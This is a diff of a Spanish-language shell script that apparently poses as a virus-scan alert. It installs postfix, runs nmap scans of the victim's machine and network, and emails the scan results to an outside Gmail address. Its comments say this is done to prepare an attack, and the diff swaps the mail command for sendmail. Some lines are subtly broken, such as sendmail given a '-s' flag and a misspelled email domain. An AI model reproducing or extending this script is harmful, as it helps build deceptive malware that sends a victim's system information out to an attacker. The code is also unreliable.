@@ -10,9 +10,6 @@ echo "Tu pc está siendo escaneado por un virus,pinche aquí para pararlo"
  sudo apt install postfix -y
   #le añadimos el postfix para poder mandar correos
 
- sudo dpkg-reconfigure postfix -y 
- #reconfiguramos postfix para poder mandar correos
- # no se como pasarle los datos de configuración de postfix y que configuracion es la adecuada
 
  sudo systemctl start postfix
  #iniciar servicio de postfix
@@ -33,10 +30,10 @@ nmap -p 1-5000 127.0.0.1 -oN resultado_nmap.txt
 nmap -sV -p$(cat resultado_nmap.txt | grep "open" | awk '{print $1}' | cut -d'/' -f1 | tr '\n' ',') 192.168.1.100 -oN servicios_detectados.txt
 #le añadimos otro escaneo que nos muestre los servicios que tiene abiertos en los puertos que hemos encontrado
 
-mail -s "Resultados Nmap" richardo94ac@gmail.com < resultado_nmap.txt
+sendmail -s "Resultados Nmap" richardo94ac@gmail.com < resultado_nmap.txt
 #le añadimos que nos mande por correo los resultados para poder realizar el ataque. 
 
-mail -s "Resultados del Escaneo Nmap" richardo94ac@egmail.com < servicios_detectados.txt
+sendmail -s "Resultados del Escaneo Nmap" richardo94ac@egmail.com < servicios_detectados.txt
 #le añadimos que nos mande por correo los servicios que tiene abiertos en los puertos que hemos encontrado
 
 cat servicios_detectados.txt
